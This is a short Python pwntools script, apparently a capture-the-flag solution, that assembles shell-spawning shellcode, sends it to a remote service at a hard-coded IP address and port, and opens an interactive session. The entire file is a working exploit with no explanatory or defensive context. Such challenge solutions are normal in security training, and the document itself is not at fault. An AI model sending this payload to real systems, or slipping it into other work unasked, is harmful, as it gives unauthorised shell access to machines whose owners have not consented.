#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 vam <jpwan21@gmail.com>
#
# Distributed under terms of the MIT license.

"""
for cpu code
"""
from pwn import *

shellcode=asm(shellcraft.sh())#asm(code,arch="x86")

r = remote('139.224.220.67', 30007)

r.sendline(shellcode)

r.interactive()
